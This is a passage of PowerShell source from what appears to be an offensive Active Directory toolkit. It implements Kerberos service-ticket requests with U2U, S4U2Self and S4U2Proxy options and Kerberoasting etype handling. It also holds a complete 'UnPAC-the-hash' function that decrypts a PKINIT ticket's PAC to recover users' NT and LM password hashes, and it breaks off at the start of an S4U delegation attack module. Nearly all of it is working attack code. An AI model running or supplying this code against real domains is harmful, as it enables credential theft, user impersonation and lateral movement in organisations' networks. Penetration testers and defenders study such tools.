                $additionalTicketsSeq = New-ASN1Sequence -Data $AdditionalTicket
                $reqBodyContent += New-ASN1ContextTag -Tag 11 -Data $additionalTicketsSeq
            } elseif ($S4U2Proxy -and $S4U2SelfTicket) {
                $additionalTicketsSeq = New-ASN1Sequence -Data $S4U2SelfTicket
                $reqBodyContent += New-ASN1ContextTag -Tag 11 -Data $additionalTicketsSeq
            }

            $reqBody = New-ASN1Sequence -Data $reqBodyContent

            # KDC-REQ (TGS-REQ)
            $kdcReqContent = @()
            $kdcReqContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value 5)  # pvno
            $kdcReqContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1Integer -Value $Script:KRB_TGS_REQ)  # msg-type
            $kdcReqContent += New-ASN1ContextTag -Tag 3 -Data $padata
            $kdcReqContent += New-ASN1ContextTag -Tag 4 -Data $reqBody

            $kdcReq = New-ASN1Sequence -Data $kdcReqContent

            # TGS-REQ = APPLICATION 12
            $tgsReq = New-ASN1ApplicationTag -Tag 12 -Data $kdcReq

            return @{
                TGSReq = $tgsReq
                Nonce = $nonce
            }
        }

        function Parse-TGSREP {
            param([byte[]]$Data)

            $result = @{
                Success = $false
                Error = $null
                Ticket = $null
                TicketEType = $null  # etype of the service ticket (for Kerberoasting)
                EncPart = $null
                EType = $null        # etype of the enc-part (for client)
                Kvno = $null
            }

            try {
                $root = Read-ASN1Element -Data $Data -Offset 0

                # Check for KRB-ERROR (APPLICATION 30)
                if (($root.Tag -band 0x1F) -eq 30) {
                    # APPLICATION tag wraps a SEQUENCE - parse inner sequence first
                    $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
                    $children = Read-ASN1Children -Data $innerSeq.Content
                    $errorCode = $null
                    $errorText = $null

                    foreach ($child in $children) {
                        if ($child.TagNumber -eq 6) {
                            $errorCode = Read-ASN1Integer -Content (Read-ASN1Element -Data $child.Content).Content
                        }
                        elseif ($child.TagNumber -eq 12) {
                            $errorText = Read-ASN1String -Content (Read-ASN1Element -Data $child.Content).Content
                        }
                    }

                    $result.Error = "KRB-ERROR $errorCode"
                    if ($errorText) { $result.Error += ": $errorText" }

                    # Use centralized Kerberos error code mapping
                    $errorDesc = Get-KerberosErrorMessage -ErrorCode $errorCode
                    $result.Error += " ($errorDesc)"

                    return $result
                }

                # Check for TGS-REP (APPLICATION 13)
                if (($root.Tag -band 0x1F) -ne 13) {
                    $result.Error = "Unexpected response type: $($root.Tag) (expected TGS-REP)"
                    return $result
                }

                # TGS-REP is [APPLICATION 13] which wraps a SEQUENCE
                $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
                $children = Read-ASN1Children -Data $innerSeq.Content

                foreach ($child in $children) {
                    switch ($child.TagNumber) {
                        5 {
                            # ticket [5] - this is the service ticket
                            $result.Ticket = $child.Content

                            # Parse the ticket to get its etype (for Kerberoasting)
                            # Ticket ::= [APPLICATION 1] SEQUENCE { tkt-vno, realm, sname, enc-part }
                            try {
                                $ticketRoot = Read-ASN1Element -Data $child.Content -Offset 0
                                # APPLICATION 1 wraps a SEQUENCE
                                $ticketSeq = Read-ASN1Element -Data $ticketRoot.Content -Offset 0
                                $ticketChildren = Read-ASN1Children -Data $ticketSeq.Content

                                foreach ($ticketChild in $ticketChildren) {
                                    if ($ticketChild.TagNumber -eq 3) {
                                        # enc-part [3] of the ticket
                                        $ticketEncPart = Read-ASN1Element -Data $ticketChild.Content
                                        $ticketEncPartChildren = Read-ASN1Children -Data $ticketEncPart.Content

                                        foreach ($tepChild in $ticketEncPartChildren) {
                                            if ($tepChild.TagNumber -eq 0) {
                                                # etype [0] - THIS is the encryption type of the service ticket
                                                # Cast to [int] for hashtable lookup compatibility (Read-ASN1Integer returns Int64)
                                                $result.TicketEType = [int](Read-ASN1Integer -Content (Read-ASN1Element -Data $tepChild.Content).Content)
                                                Write-Log "[Parse-TGSREP] Ticket etype: $($result.TicketEType)"
                                            }
                                        }
                                    }
                                }
                            } catch {
                                Write-Log "[Parse-TGSREP] Failed to parse ticket etype: $_"
                            }
                        }
                        6 {
                            # enc-part [6] - encrypted part for the client
                            $encPartSeq = Read-ASN1Element -Data $child.Content
                            $encPartChildren = Read-ASN1Children -Data $encPartSeq.Content

                            foreach ($encChild in $encPartChildren) {
                                if ($encChild.TagNumber -eq 0) {
                                    # Cast to [int] for hashtable lookup compatibility
                                    $result.EType = [int](Read-ASN1Integer -Content (Read-ASN1Element -Data $encChild.Content).Content)
                                }
                                elseif ($encChild.TagNumber -eq 1) {
                                    $result.Kvno = [int](Read-ASN1Integer -Content (Read-ASN1Element -Data $encChild.Content).Content)
                                }
                                elseif ($encChild.TagNumber -eq 2) {
                                    $result.EncPart = (Read-ASN1Element -Data $encChild.Content).Content
                                }
                            }
                        }
                    }
                }

                $result.Success = $true
            }
            catch {
                $result.Error = "Failed to parse TGS-REP: $_"
            }

            return $result
        }

        function Parse-EncTGSRepPart {
            param(
                [byte[]]$Data,
                [byte[]]$Key,
                [int]$EType
            )

            # Key usage 8 for TGS-REP encrypted part (when encrypted with TGT session key)
            $keyUsage = 8

            try {
                switch ($EType) {
                    23 { $decrypted = Decrypt-RC4HMAC -Key $Key -CipherText $Data -KeyUsage $keyUsage }
                    17 { $decrypted = Decrypt-AESCTS -Key $Key -CipherText $Data -KeyUsage $keyUsage }
                    18 { $decrypted = Decrypt-AESCTS -Key $Key -CipherText $Data -KeyUsage $keyUsage }
                    default { throw "Unsupported encryption type: $EType" }
                }
            }
            catch {
                return @{ Success = $false; Error = "Decryption failed: $_" }
            }

            $result = @{
                Success = $true
                SessionKey = $null
                SessionKeyType = $null
                TicketFlags = $null
                AuthTime = $null
                StartTime = $null
                EndTime = $null
                RenewTill = $null
            }

            try {
                $root = Read-ASN1Element -Data $decrypted

                # EncTGSRepPart is [APPLICATION 26] which contains a SEQUENCE
                $contentToParse = $root.Content
                if ($root.Tag -eq 0x30) {
                    # Already a SEQUENCE - use directly
                    $contentToParse = $root.Content
                } else {
                    # APPLICATION tag wrapping a SEQUENCE
                    $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
                    $contentToParse = $innerSeq.Content
                }

                $children = Read-ASN1Children -Data $contentToParse

                # EncKDCRepPart structure (RFC 4120):
                # key             [0] EncryptionKey,
                # last-req        [1] LastReq,
                # nonce           [2] UInt32,
                # key-expiration  [3] KerberosTime OPTIONAL,
                # flags           [4] TicketFlags,
                # authtime        [5] KerberosTime,
                # starttime       [6] KerberosTime OPTIONAL,
                # endtime         [7] KerberosTime,
                # renew-till      [8] KerberosTime OPTIONAL,

                foreach ($child in $children) {
                    switch ($child.TagNumber) {
                        0 {
                            # key [0] EncryptionKey
                            $keySeq = Read-ASN1Element -Data $child.Content
                            $keyChildren = Read-ASN1Children -Data $keySeq.Content

                            foreach ($keyChild in $keyChildren) {
                                if ($keyChild.TagNumber -eq 0) {
                                    $result.SessionKeyType = Read-ASN1Integer -Content (Read-ASN1Element -Data $keyChild.Content).Content
                                }
                                elseif ($keyChild.TagNumber -eq 1) {
                                    $result.SessionKey = (Read-ASN1Element -Data $keyChild.Content).Content
                                }
                            }
                        }
                        4 {
                            # flags [4] TicketFlags (BIT STRING, 4 bytes)
                            $flagElement = Read-ASN1Element -Data $child.Content
                            # BIT STRING: first byte is number of unused bits, remaining bytes are the flag data
                            if ($flagElement.Content.Length -ge 5) {
                                $result.TicketFlags = $flagElement.Content[1..4]
                            } elseif ($flagElement.Content.Length -eq 4) {
                                $result.TicketFlags = $flagElement.Content
                            }
                        }
                        5 {
                            # authtime [5] KerberosTime
                            $timeElement = Read-ASN1Element -Data $child.Content
                            $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
                            $result.AuthTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
                        }
                        6 {
                            # starttime [6] KerberosTime OPTIONAL
                            $timeElement = Read-ASN1Element -Data $child.Content
                            $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
                            $result.StartTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
                        }
                        7 {
                            # endtime [7] KerberosTime
                            $timeElement = Read-ASN1Element -Data $child.Content
                            $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
                            $result.EndTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
                        }
                        8 {
                            # renew-till [8] KerberosTime OPTIONAL
                            $timeElement = Read-ASN1Element -Data $child.Content
                            $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
                            $result.RenewTill = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
                        }
                    }
                }
            }
            catch {
                $result.Success = $false
                $result.Error = "Failed to parse EncTGSRepPart: $_"
            }

            return $result
        }
    }

    process {
        try {
            $realmUpper = $Domain.ToUpper()

            # Validate S4U parameters
            if ($S4U2Self -and -not $ImpersonateUser) {
                throw "S4U2Self requires -ImpersonateUser parameter"
            }
            if ($S4U2Proxy -and -not $AdditionalTicket) {
                throw "S4U2Proxy requires -AdditionalTicket parameter (S4U2Self service ticket bytes)"
            }
            if ($ResourceBased -and -not $S4U2Proxy) {
                throw "ResourceBased requires -S4U2Proxy switch to be set"
            }

            if ($U2U) {
                # U2U: ServicePrincipalName is the target username, no SPN parsing needed
                $serviceName = $ServicePrincipalName
                $serviceInstance = $null
                Write-Log "[Request-ServiceTicket] Requesting U2U TGS for user '$ServicePrincipalName' via $DomainController (etype $SessionKeyType)"
            } elseif ($S4U2Self) {
                # S4U2Self: ServicePrincipalName is the service account username (ticket to self)
                $serviceName = $ServicePrincipalName
                $serviceInstance = $null
                Write-Log "[Request-ServiceTicket] Requesting S4U2Self TGS on behalf of '$ImpersonateUser' via $DomainController (etype $SessionKeyType)"
            } elseif ($S4U2Proxy) {
                # S4U2Proxy: Parse SPN normally (target service)
                $spnParts = $ServicePrincipalName -split '/'
                if ($spnParts.Count -lt 2) {
                    throw "Invalid SPN format. Expected: service/instance (e.g., ldap/dc01.contoso.com)"
                }
                $serviceName = $spnParts[0]
                $serviceInstance = $spnParts[1..($spnParts.Count-1)] -join '/'
                Write-Log "[Request-ServiceTicket] Requesting S4U2Proxy TGS for $ServicePrincipalName via $DomainController (etype $SessionKeyType)"
            } else {
                # Normal TGS: Parse SPN into service/instance
                $spnParts = $ServicePrincipalName -split '/'
                if ($spnParts.Count -lt 2) {
                    throw "Invalid SPN format. Expected: service/instance (e.g., ldap/dc01.contoso.com)"
                }
                $serviceName = $spnParts[0]
                $serviceInstance = $spnParts[1..($spnParts.Count-1)] -join '/'
                Write-Log "[Request-ServiceTicket] Requesting TGS for $ServicePrincipalName via $DomainController (etype $SessionKeyType)"
            }

            # Build TGS-REQ
            $tgsReqParams = @{
                TGT = $TGT
                SessionKey = $SessionKey
                SessionKeyType = $SessionKeyType
                UserName = $UserName
                Realm = $Domain
                ServiceName = $serviceName
                ServiceInstance = $serviceInstance
            }
            if ($U2U) {
                $tgsReqParams['U2U'] = $true
                $tgsReqParams['AdditionalTicket'] = $TGT  # TGT is the additional ticket for U2U
            }
            if ($S4U2Self) {
                $tgsReqParams['S4U2Self'] = $true
                $tgsReqParams['ImpersonateUser'] = $ImpersonateUser
                if ($ImpersonateRealm) { $tgsReqParams['ImpersonateRealm'] = $ImpersonateRealm }
            }
            if ($S4U2Proxy) {
                $tgsReqParams['S4U2Proxy'] = $true
                $tgsReqParams['S4U2SelfTicket'] = $AdditionalTicket
                if ($ResourceBased) { $tgsReqParams['ResourceBased'] = $true }
            }
            $tgsReqResult = New-KerberosTGSREQ @tgsReqParams
            $tgsReqBytes = $tgsReqResult.TGSReq

            Write-Log "[Request-ServiceTicket] TGS-REQ built ($($tgsReqBytes.Length) bytes), sending to KDC..."

            # Send to KDC
            $responseBytes = Send-KerberosRequest -Server $DomainController -Request $tgsReqBytes

            Write-Log "[Request-ServiceTicket] Received response ($($responseBytes.Length) bytes)"

            # Parse TGS-REP
            $tgsRep = Parse-TGSREP -Data $responseBytes

            if (-not $tgsRep.Success) {
                throw $tgsRep.Error
            }

            Write-Log "[Request-ServiceTicket] TGS-REP received (ticket etype: $($tgsRep.TicketEType), enc-part etype: $($tgsRep.EType))"

            # Decrypt enc-part to get service session key
            $encRepPart = Parse-EncTGSRepPart -Data $tgsRep.EncPart -Key $SessionKey -EType $tgsRep.EType

            if (-not $encRepPart.Success) {
                Write-Warning "[!] Failed to decrypt enc-part: $($encRepPart.Error)"
                Write-Warning "[!] Continuing with ticket (session key unknown)..."
                $serviceSessionKey = $null
            } else {
                $serviceSessionKey = $encRepPart.SessionKey
                Write-Log "[Request-ServiceTicket] Service session key extracted ($($serviceSessionKey.Length) bytes, type $($encRepPart.SessionKeyType))"
            }

            # Build result
            $ticketB64 = [Convert]::ToBase64String($tgsRep.Ticket)
            $sessionKeyB64 = if ($serviceSessionKey) { [Convert]::ToBase64String($serviceSessionKey) } else { $null }

            # Use TicketEType for Kerberoasting (the actual ticket encryption), fallback to EType if not parsed
            $ticketEncryptionType = if ($tgsRep.TicketEType) { $tgsRep.TicketEType } else { $tgsRep.EType }

            return [PSCustomObject]@{
                Success = $true
                ServicePrincipalName = $ServicePrincipalName
                Domain = $realmUpper
                DomainController = $DomainController
                EncryptionType = $ticketEncryptionType  # Ticket etype (for Kerberoasting)
                EncPartEType = $tgsRep.EType            # Enc-part etype (for client)
                Ticket = $ticketB64
                TicketBytes = $tgsRep.Ticket
                SessionKey = $sessionKeyB64
                SessionKeyBytes = $serviceSessionKey
                SessionKeyType = if ($encRepPart.SessionKeyType) { $encRepPart.SessionKeyType } else { $tgsRep.EType }
                TicketFlags = $encRepPart.TicketFlags
                AuthTime = $encRepPart.AuthTime
                StartTime = $encRepPart.StartTime
                EndTime = $encRepPart.EndTime
                RenewTill = $encRepPart.RenewTill
                Message = "Service ticket acquired successfully"
            }
        }
        catch {
            Write-Log "[Request-ServiceTicket] TGS-REQ failed: $_"
            Write-Debug "[Request-ServiceTicket] Error details: $($_.Exception.ToString())"

            return [PSCustomObject]@{
                Success = $false
                ServicePrincipalName = $ServicePrincipalName
                Domain = $Domain
                DomainController = $DomainController
                Error = $_.Exception.Message
                Message = "TGS-REQ failed: $_"
            }
        }
    }

    end {
        Write-Log "[Request-ServiceTicket] TGS request completed"
    }
}



# ----- Invoke-UnPACTheHash.ps1 -----

<#
.SYNOPSIS
    Recovers the NT hash from a PKINIT-authenticated TGT via User-to-User (U2U) Kerberos.

.DESCRIPTION
    Implements the "UnPAC-the-hash" technique to extract the user's NT hash from
    the PAC_CREDENTIAL_INFO buffer (Type 2) in a U2U service ticket.

    Protocol flow:
    1. Send U2U TGS-REQ to self (enc-tkt-in-skey, TGT as additional-ticket)
    2. KDC returns service ticket with PAC_CREDENTIAL_INFO containing encrypted credentials
    3. Decrypt service ticket enc-part with TGT session key (KeyUsage=2)
    4. Parse EncTicketPart to extract PAC
    5. Decrypt PAC_CREDENTIAL_INFO with AS-REP Reply Key (KeyUsage=16)
    6. Parse NDR-serialized NTLM_SUPPLEMENTAL_CREDENTIAL to extract NT hash

    This technique only works with PKINIT authentication because the KDC includes
    the PAC_CREDENTIAL_INFO buffer only when Diffie-Hellman key exchange was used
    (the KDC cannot encrypt credentials with a key the client already knows).

.PARAMETER TGT
    The TGT ticket bytes (raw APPLICATION 1 Ticket from PKINIT AS-REP).

.PARAMETER SessionKey
    The TGT session key bytes (from EncASRepPart).

.PARAMETER SessionKeyType
    The encryption type of the session key (17=AES128, 18=AES256, 23=RC4).

.PARAMETER ASRepReplyKey
    The DH-derived AS-REP Reply Key (from PKINIT key exchange).
    Used to decrypt PAC_CREDENTIAL_INFO (KeyUsage=16).

.PARAMETER UserName
    The authenticated user's sAMAccountName.

.PARAMETER Domain
    The target domain (realm).

.PARAMETER DomainController
    The KDC server to send the U2U TGS-REQ to.

.OUTPUTS
    PSCustomObject with Success, NTHash, LMHash, UserName, Domain properties.

.NOTES
    Author: Alexander Sturz (@_61106960_)
    References:
    - MS-PAC Section 2.6: PAC_CREDENTIAL_INFO
    - MS-PAC Section 2.6.1: PAC_CREDENTIAL_DATA (NDR)
    - MS-PAC Section 2.6.3: NTLM_SUPPLEMENTAL_CREDENTIAL
    - RFC 4120 Section 3.3.1: User-to-User Authentication
    - Rubeus (GhostPack): UnPAC-the-hash implementation
    - Certipy: auth.py UnPAC-the-hash implementation
#>

function Invoke-UnPACTheHash {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$TGT,

        [Parameter(Mandatory=$true)]
        [byte[]]$SessionKey,

        [Parameter(Mandatory=$true)]
        [ValidateSet(17, 18, 23)]
        [int]$SessionKeyType,

        [Parameter(Mandatory=$true)]
        [byte[]]$ASRepReplyKey,

        [Parameter(Mandatory=$true)]
        [string]$UserName,

        [Parameter(Mandatory=$true)]
        [string]$Domain,

        [Parameter(Mandatory=$true)]
        [string]$DomainController
    )

    process {
        try {
            Write-Log "[Invoke-UnPACTheHash] Starting UnPAC-the-hash for $UserName@$Domain"

            # Step 1: U2U TGS-REQ to self
            # The enc-tkt-in-skey option tells the KDC to encrypt the service ticket
            # with the session key from the additional-ticket (our TGT)
            Write-Log "[Invoke-UnPACTheHash] Sending U2U TGS-REQ to $DomainController"

            $u2uResult = Request-ServiceTicket `
                -TGT $TGT `
                -SessionKey $SessionKey `
                -SessionKeyType $SessionKeyType `
                -ServicePrincipalName $UserName `
                -Domain $Domain `
                -DomainController $DomainController `
                -UserName $UserName `
                -U2U

            if (-not $u2uResult.Success) {
                throw "U2U TGS-REQ failed: $($u2uResult.Error)"
            }

            Write-Log "[Invoke-UnPACTheHash] U2U TGS-REP received, ticket etype: $($u2uResult.EncryptionType)"

            # Step 2: Parse the service ticket to get the encrypted part
            # TicketBytes contains the full APPLICATION 1 Ticket
            $ticketInfo = Read-KerberosTicket -TicketBytes $u2uResult.TicketBytes

            if (-not $ticketInfo.EncPart) {
                throw "Failed to extract enc-part from U2U service ticket"
            }

            Write-Log "[Invoke-UnPACTheHash] Service ticket enc-part: $($ticketInfo.EncPart.Length) bytes, etype: $($ticketInfo.EType)"

            # Step 3: Decrypt the service ticket enc-part with TGT session key (KeyUsage=2)
            # In U2U, the service ticket is encrypted with the TGT session key (from additional-ticket)
            $decryptedTicket = Unprotect-KerberosNative `
                -Key $SessionKey `
                -CipherText $ticketInfo.EncPart `
                -KeyUsage 2 `
                -EncryptionType $SessionKeyType

            if (-not $decryptedTicket -or $decryptedTicket.Length -eq 0) {
                throw "Failed to decrypt U2U service ticket enc-part"
            }

            Write-Log "[Invoke-UnPACTheHash] Decrypted EncTicketPart: $($decryptedTicket.Length) bytes"

            # Step 4: Parse EncTicketPart to extract PAC
            $encTicketPart = Read-EncTicketPart -EncTicketPartBytes $decryptedTicket

            if (-not $encTicketPart.PAC) {
                throw "No PAC found in U2U service ticket"
            }

            Write-Log "[Invoke-UnPACTheHash] PAC extracted: $($encTicketPart.PAC.Length) bytes"

            # Step 5: Parse PAC to find PAC_CREDENTIAL_INFO (Buffer Type 2)
            $pacResult = Read-PAC -PACData $encTicketPart.PAC

            if (-not $pacResult -or -not $pacResult.CredentialInfoBuffer) {
                throw "No PAC_CREDENTIAL_INFO (Type 2) buffer found in PAC. The KDC may not include credentials for this authentication type."
            }

            $credInfoBuffer = $pacResult.CredentialInfoBuffer
            Write-Log "[Invoke-UnPACTheHash] PAC_CREDENTIAL_INFO found: $($credInfoBuffer.Length) bytes"

            # Step 6: Parse PAC_CREDENTIAL_INFO header
            # Structure: Version(4 bytes, UInt32) + EncryptionType(4 bytes, UInt32) + SerializedData(rest)
            if ($credInfoBuffer.Length -lt 12) {
                throw "PAC_CREDENTIAL_INFO too short: $($credInfoBuffer.Length) bytes (minimum 12)"
            }

            $credVersion = [BitConverter]::ToUInt32($credInfoBuffer, 0)
            $credEncType = [BitConverter]::ToUInt32($credInfoBuffer, 4)
            $serializedData = $credInfoBuffer[8..($credInfoBuffer.Length - 1)]

            Write-Log "[Invoke-UnPACTheHash] PAC_CREDENTIAL_INFO: version=$credVersion, etype=$credEncType, data=$($serializedData.Length) bytes"

            if ($credVersion -ne 0) {
                Write-Warning "[!] Unexpected PAC_CREDENTIAL_INFO version: $credVersion (expected 0)"
            }

            # Step 7: Decrypt PAC_CREDENTIAL_INFO with AS-REP Reply Key (KeyUsage=16)
            # This is the DH-derived key from PKINIT, NOT the TGT session key
            $decryptedCreds = Unprotect-KerberosNative `
                -Key $ASRepReplyKey `
                -CipherText $serializedData `
                -KeyUsage 16 `
                -EncryptionType $credEncType

            if (-not $decryptedCreds -or $decryptedCreds.Length -eq 0) {
                throw "Failed to decrypt PAC_CREDENTIAL_INFO"
            }

            Write-Log "[Invoke-UnPACTheHash] Decrypted credential data: $($decryptedCreds.Length) bytes"

            # Step 8: Parse NDR-serialized PAC_CREDENTIAL_DATA
            # NDR Type Serialization 1 header: 16 bytes (8 common + 8 private)
            # Then optional top-level referent pointer (4 bytes)
            # Common header starts with 0x01 0x10
            $ntHash = $null
            $lmHash = $null
            $offset = 0

            # Skip NDR Type Serialization 1 header
            if ($decryptedCreds.Length -lt 24) {
                throw "Decrypted credential data too short for NDR header: $($decryptedCreds.Length) bytes"
            }

            # Verify common header signature
            if ($decryptedCreds[0] -eq 0x01 -and $decryptedCreds[1] -eq 0x10) {
                $offset = 16  # Skip 16-byte NDR header (8 common + 8 private)
                Write-Log "[Invoke-UnPACTheHash] NDR Type Serialization 1 header detected"
            } else {
                Write-Log "[Invoke-UnPACTheHash] No NDR Type Serialization header, parsing from start" -Level Warning
            }

            # Skip top-level referent pointer (4 bytes) if present
            # The referent pointer is a non-null pointer to the PAC_CREDENTIAL_DATA structure
            if ($offset + 4 -le $decryptedCreds.Length) {
                $topLevelPtr = [BitConverter]::ToUInt32($decryptedCreds, $offset)
                if ($topLevelPtr -ne 0) {
                    $offset += 4
                    Write-Log "[Invoke-UnPACTheHash] Top-level referent pointer: 0x$($topLevelPtr.ToString('X8'))"
                }
            }

            # PAC_CREDENTIAL_DATA: CredentialCount (4 bytes UInt32)
            if ($offset + 4 -gt $decryptedCreds.Length) {
                throw "Not enough data for CredentialCount at offset $offset"
            }

            $credentialCount = [BitConverter]::ToUInt32($decryptedCreds, $offset)
            $offset += 4
            Write-Log "[Invoke-UnPACTheHash] CredentialCount: $credentialCount"

            if ($credentialCount -eq 0) {
                throw "No credentials found in PAC_CREDENTIAL_DATA"
            }

            # Skip conformant array MaxCount (4 bytes) - NDR conformant arrays
            # have a MaxCount prefix before the actual array elements
            if ($offset + 4 -gt $decryptedCreds.Length) {
                throw "Not enough data for conformant array MaxCount at offset $offset"
            }
            $arrayMaxCount = [BitConverter]::ToUInt32($decryptedCreds, $offset)
            $offset += 4
            Write-Log "[Invoke-UnPACTheHash] Conformant array MaxCount: $arrayMaxCount"

            # Parse SECPKG_SUPPLEMENTAL_CRED entries (NDR encoded)
            # Each entry has: PackageName (RPC_UNICODE_STRING), CredentialSize (UInt32), Credentials (pointer)
            # NDR RPC_UNICODE_STRING: Length(2) + MaxLength(2) + Pointer(4)
            # We need to read all fixed-size parts first, then referents

            # Fixed part of each SECPKG_SUPPLEMENTAL_CRED:
            # - PackageName.Length (2 bytes)
            # - PackageName.MaximumLength (2 bytes)
            # - PackageName.Buffer pointer (4 bytes)
            # - CredentialSize (4 bytes)
            # - Credentials pointer (4 bytes)
            # Total: 16 bytes per entry

            $entries = @()
            for ($i = 0; $i -lt $credentialCount; $i++) {
                if ($offset + 16 -gt $decryptedCreds.Length) {
                    Write-Log "[Invoke-UnPACTheHash] Not enough data for entry $i at offset $offset" -Level Warning
                    break
                }

                $pkgNameLength = [BitConverter]::ToUInt16($decryptedCreds, $offset)
                $pkgNameMaxLen = [BitConverter]::ToUInt16($decryptedCreds, $offset + 2)
                $pkgNamePtr = [BitConverter]::ToUInt32($decryptedCreds, $offset + 4)
                $credSize = [BitConverter]::ToUInt32($decryptedCreds, $offset + 8)
                $credPtr = [BitConverter]::ToUInt32($decryptedCreds, $offset + 12)
                $offset += 16

                $entries += @{
                    PackageNameLength = $pkgNameLength
                    PackageNameMaxLength = $pkgNameMaxLen
                    PackageNamePtr = $pkgNamePtr
                    CredentialSize = $credSize
                    CredentialPtr = $credPtr
                }

                Write-Log "[Invoke-UnPACTheHash] Entry ${i}: nameLen=$pkgNameLength, credSize=$credSize, namePtr=0x$($pkgNamePtr.ToString('X8')), credPtr=0x$($credPtr.ToString('X8'))"
            }

            # Now parse referents in declaration order
            # For each entry: PackageName referent (if pointer != 0), then Credentials referent (if pointer != 0)
            foreach ($entry in $entries) {
                $packageName = $null

                # PackageName referent (RPC_UNICODE_STRING)
                if ($entry.PackageNamePtr -ne 0) {
                    if ($offset + 12 -gt $decryptedCreds.Length) {
                        Write-Log "[Invoke-UnPACTheHash] Not enough data for PackageName referent at offset $offset" -Level Warning
                        break
                    }

                    # MaxCount(4) + Offset(4) + ActualCount(4) + UTF-16LE data
                    $maxCount = [BitConverter]::ToUInt32($decryptedCreds, $offset)
                    $ndrOffset = [BitConverter]::ToUInt32($decryptedCreds, $offset + 4)
                    $actualCount = [BitConverter]::ToUInt32($decryptedCreds, $offset + 8)
                    $offset += 12

                    $stringByteLen = $actualCount * 2  # UTF-16LE
                    if ($offset + $stringByteLen -gt $decryptedCreds.Length) {
                        Write-Log "[Invoke-UnPACTheHash] Not enough data for PackageName string at offset $offset" -Level Warning
                        break
                    }

                    $packageName = [System.Text.Encoding]::Unicode.GetString($decryptedCreds, $offset, $stringByteLen)
                    $offset += $stringByteLen

                    # Align to 4-byte boundary
                    $padding = (4 - ($offset % 4)) % 4
                    $offset += $padding

                    Write-Log "[Invoke-UnPACTheHash] Package: '$packageName'"
                }

                # Credentials referent
                if ($entry.CredentialPtr -ne 0 -and $entry.CredentialSize -gt 0) {
                    # Conformant byte array: MaxCount(4) + data
                    if ($offset + 4 -gt $decryptedCreds.Length) {
                        Write-Log "[Invoke-UnPACTheHash] Not enough data for Credentials MaxCount at offset $offset" -Level Warning
                        break
                    }

                    $credMaxCount = [BitConverter]::ToUInt32($decryptedCreds, $offset)
                    $offset += 4

                    $credDataLen = [Math]::Min($credMaxCount, $entry.CredentialSize)
                    if ($offset + $credDataLen -gt $decryptedCreds.Length) {
                        Write-Log "[Invoke-UnPACTheHash] Not enough data for Credentials at offset $offset (need $credDataLen)" -Level Warning
                        break
                    }

                    $credData = $decryptedCreds[$offset..($offset + $credDataLen - 1)]
                    $offset += $credDataLen

                    # Align to 4-byte boundary
                    $padding = (4 - ($offset % 4)) % 4
                    $offset += $padding

                    # Check if this is the NTLM package
                    if ($packageName -eq "NTLM") {
                        # NTLM_SUPPLEMENTAL_CREDENTIAL:
                        # Version (4 bytes, UInt32) = 0
                        # Flags (4 bytes, UInt32) - bit 1 = LM present, bit 2 = NT present
                        # LmPassword (16 bytes)
                        # NtPassword (16 bytes)
                        if ($credData.Length -ge 40) {
                            $ntlmVersion = [BitConverter]::ToUInt32($credData, 0)
                            $ntlmFlags = [BitConverter]::ToUInt32($credData, 4)
                            $lmBytes = $credData[8..23]
                            $ntBytes = $credData[24..39]

                            Write-Log "[Invoke-UnPACTheHash] NTLM_SUPPLEMENTAL_CREDENTIAL: version=$ntlmVersion, flags=$ntlmFlags"

                            # Flags: 1 = LM_OWF_PASSWORD, 2 = NT_OWF_PASSWORD
                            if ($ntlmFlags -band 2) {
                                $ntHash = ($ntBytes | ForEach-Object { $_.ToString("x2") }) -join ''
                                Write-Log "[Invoke-UnPACTheHash] NT hash recovered: $ntHash"
                            }

                            if ($ntlmFlags -band 1) {
                                $lmHash = ($lmBytes | ForEach-Object { $_.ToString("x2") }) -join ''
                                Write-Log "[Invoke-UnPACTheHash] LM hash recovered: $lmHash"
                            }
                        } else {
                            Write-Log "[Invoke-UnPACTheHash] NTLM credential data too short: $($credData.Length) bytes (expected >= 40)" -Level Warning
                        }
                    } else {
                        Write-Log "[Invoke-UnPACTheHash] Skipping non-NTLM package: '$packageName'"
                    }
                }
            }

            if (-not $ntHash) {
                throw "NT hash not found in PAC_CREDENTIAL_DATA"
            }

            Write-Log "[Invoke-UnPACTheHash] UnPAC-the-hash successful for $UserName@$Domain"

            return [PSCustomObject]@{
                Success  = $true
                NTHash   = $ntHash
                LMHash   = $lmHash
                UserName = $UserName
                Domain   = $Domain
                Message  = "NT hash recovered via UnPAC-the-hash"
            }
        }
        catch {
            Write-Log "[Invoke-UnPACTheHash] Failed: $_" -Level Warning
            return [PSCustomObject]@{
                Success  = $false
                NTHash   = $null
                LMHash   = $null
                UserName = $UserName
                Domain   = $Domain
                Message  = "UnPAC-the-hash failed: $_"
            }
        }
    }
}



# ----- Invoke-S4U.ps1 -----

# Invoke-S4U.ps1
# S4U (Service for User) Attack Implementation
# Supports Classic Constrained Delegation and Resource-Based Constrained Delegation (RBCD)
#
# Architecture:
# - Invoke-S4UCore: Internal function containing S4U workflow logic
# - Invoke-ConstrainedDelegation: Public function for Classic CD (Scenario 1)
# - Invoke-RBCD: Public function for RBCD attacks (Scenarios 2+3)

# ============================================================================
# LAYER 1: Internal Core Function
# ============================================================================

function Invoke-S4UCore {
    <#
    .SYNOPSIS
        Internal core function for S4U attacks. Not intended for direct use.

    .DESCRIPTION
